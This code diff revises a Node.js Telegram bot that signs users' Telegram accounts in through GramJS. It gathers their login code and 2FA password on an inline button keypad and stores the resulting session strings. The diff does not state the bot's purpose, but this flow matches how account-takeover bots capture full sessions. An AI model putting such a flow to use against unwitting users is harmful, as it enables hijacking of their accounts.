@@ -101,7 +101,6 @@ async function getClient(userId) {
     const sessionStr = await getSessionStr(userId);
     if (!sessionStr) return null;
 
-    // FIX: Configured global options to prevent timeout loops on active channels
     client = new TelegramClient(new StringSession(sessionStr), API_ID, API_HASH, { 
       connectionRetries: 5,
       useWSS: true,
@@ -393,16 +392,18 @@ bot.on("message", async (msg) => {
 
   try {
     if (state.step === "PHONE") {
-      const cleanPhone = msg.text.replace(/\s+/g, "");
-      
-      // FIX: Configured setup client with update listeners disabled to eliminate the update loop timeouts
+      // Clean phone numbers cleanly so auth.SendCode doesn't trigger PHONE_NUMBER_INVALID
+      let cleanPhone = msg.text.replace(/[\s()\-]+/g, "");
+      if (!cleanPhone.startsWith("+")) {
+        cleanPhone = "+" + cleanPhone;
+      }
+
       const client = new TelegramClient(new StringSession(""), API_ID, API_HASH, { 
         connectionRetries: 5,
         useWSS: true,
         floodSleepThreshold: 60
       });
       
-      // Explicitly tell GramJS's update loop manager not to process stream packages during initialization
       client._keepAlive = false; 
       await client.connect();
 
@@ -410,10 +411,37 @@ bot.on("message", async (msg) => {
       const codePromise = new Promise((resolve) => { resolveCode = resolve; });
       const passwordPromise = new Promise((resolve) => { resolvePassword = resolve; });
 
+      // FIX: Seamless execution callbacks passing the promises natively to eliminate 2FA timing collision bugs
       client.start({
         phoneNumber: async () => cleanPhone,
-        phoneCode: async () => await codePromise,
-        password: async () => await passwordPromise,
+        phoneCode: async () => {
+          loginStates.set(userId, { 
+            step: "CODE", 
+            client, 
+            resolveCode, 
+            resolvePassword,
+            codeBuffer: "" 
+          });
+          bot.sendMessage(userId, "📬 Click the buttons below to enter the verification code sent by Telegram:\n\nEntered: `(empty)`", {
+            parse_mode: "Markdown",
+            reply_markup: getNumericPadKeyboard("")
+          });
+          return await codePromise;
+        },
+        password: async () => {
+          loginStates.set(userId, { 
+            step: "2FA", 
+            client, 
+            resolveCode, 
+            resolvePassword,
+            codeBuffer: "" 
+          });
+          bot.sendMessage(userId, "🔑 2FA is enabled on your account. Please use the button pad matrix below to enter your account password digits:", {
+            parse_mode: "Markdown",
+            reply_markup: getNumericPadKeyboard("")
+          });
+          return await passwordPromise;
+        },
         onError: (err) => { throw err; }
       }).then(async () => {
         await finishLogin(userId, client);
@@ -421,19 +449,6 @@ bot.on("message", async (msg) => {
         console.error("Async login internal error:", err);
         bot.sendMessage(userId, `❌ Login process broken: ${err.message}`);
         loginStates.delete(userId);
-      });
-
-      loginStates.set(userId, { 
-        step: "CODE", 
-        client, 
-        resolveCode, 
-        resolvePassword,
-        codeBuffer: "" 
-      });
-
-      bot.sendMessage(userId, "📬 Click the buttons below to enter the verification code sent by Telegram:\n\nEntered: `(empty)`", {
-        parse_mode: "Markdown",
-        reply_markup: getNumericPadKeyboard("")
       });
     }
   } catch (err) {
@@ -591,7 +606,9 @@ bot.on("callback_query", async (query) => {
     if (key === "clear") {
       state.codeBuffer = "";
       bot.answerCallbackQuery(query.id, { text: "Cleared" });
-      bot.editMessageText(`📬 Click the buttons below to enter the verification code sent by Telegram:\n\nEntered: \`(empty)\``, {
+      
+      const label = state.step === "2FA" ? "🔑 Please use the button pad matrix below to enter your account password digits:" : "📬 Click the buttons below to enter the verification code sent by Telegram:";
+      bot.editMessageText(`${label}\n\nEntered: \`(empty)\``, {
         chat_id: query.message.chat.id,
         message_id: query.message.message_id,
         parse_mode: "Markdown",
@@ -607,17 +624,8 @@ bot.on("callback_query", async (query) => {
       const submittedCode = state.codeBuffer;
       
       if (state.step === "CODE") {
-        loginStates.set(userId, { ...state, step: "2FA_CHECK", codeBuffer: "" });
         state.resolveCode(submittedCode);
-
-        setTimeout(() => {
-          const currentState = loginStates.get(userId);
-          if (currentState && currentState.step === "2FA_CHECK") {
-            loginStates.set(userId, { ...currentState, step: "2FA", codeBuffer: "" });
-            bot.sendMessage(userId, "🔑 2FA is enabled. Use the keypad matrix to enter your custom password or 2FA code digits:");
-          }
-        }, 2000);
-      } else if (state.step === "2FA" || state.step === "2FA_CHECK") {
+      } else if (state.step === "2FA") {
         state.resolvePassword(submittedCode);
       }
       return;
@@ -627,8 +635,9 @@ bot.on("callback_query", async (query) => {
     bot.answerCallbackQuery(query.id);
     
     const maskedText = "*".repeat(state.codeBuffer.length);
+    const label = state.step === "2FA" ? "🔑 Please use the button pad matrix below to enter your account password digits:" : "📬 Click the buttons below to enter the verification code sent by Telegram:";
 
-    bot.editMessageText(`📬 Click the buttons below to enter the verification code sent by Telegram:\n\nEntered: \`${maskedText}\``, {
+    bot.editMessageText(`${label}\n\nEntered: \`${maskedText}\``, {
       chat_id: query.message.chat.id,
       message_id: query.message.message_id,
       parse_mode: "Markdown",
